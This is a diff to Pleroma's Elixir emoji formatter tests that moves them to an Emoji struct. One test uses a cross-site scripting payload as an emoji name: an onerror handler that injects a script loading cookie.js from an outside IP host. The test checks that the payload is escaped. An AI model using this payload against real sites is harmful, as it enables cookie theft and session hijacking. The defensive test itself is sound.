@@ -3,6 +3,7 @@
 # SPDX-License-Identifier: AGPL-3.0-only
 
 defmodule Pleroma.Emoji.FormatterTest do
+  alias Pleroma.Emoji
   alias Pleroma.Emoji.Formatter
   use Pleroma.DataCase
 
@@ -20,15 +21,17 @@ defmodule Pleroma.Emoji.FormatterTest do
       text =
         "I love :'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a):"
 
-      custom_emoji = %{
-        "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)" =>
+      custom_emoji =
+        {
+          "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)",
           "https://placehold.it/1x1"
-      }
+        }
+        |> Pleroma.Emoji.build()
 
       expected_result =
         "I love <img class=\"emoji\" alt=\"\" title=\"\" src=\"https://placehold.it/1x1\" />"
 
-      assert Formatter.emojify(text, custom_emoji) == expected_result
+      assert Formatter.emojify(text, [{custom_emoji.code, custom_emoji}]) == expected_result
     end
   end
 
@@ -37,7 +40,14 @@ defmodule Pleroma.Emoji.FormatterTest do
       text = "I love :firefox:"
 
       assert Formatter.get_emoji(text) == [
-               {"firefox", "/emoji/Firefox.gif", ["Gif", "Fun"], "firefox", "/emoji/Firefox.gif"}
+               {"firefox",
+                %Emoji{
+                  code: "firefox",
+                  file: "/emoji/Firefox.gif",
+                  tags: ["Gif", "Fun"],
+                  safe_code: "firefox",
+                  safe_file: "/emoji/Firefox.gif"
+                }}
              ]
     end
 
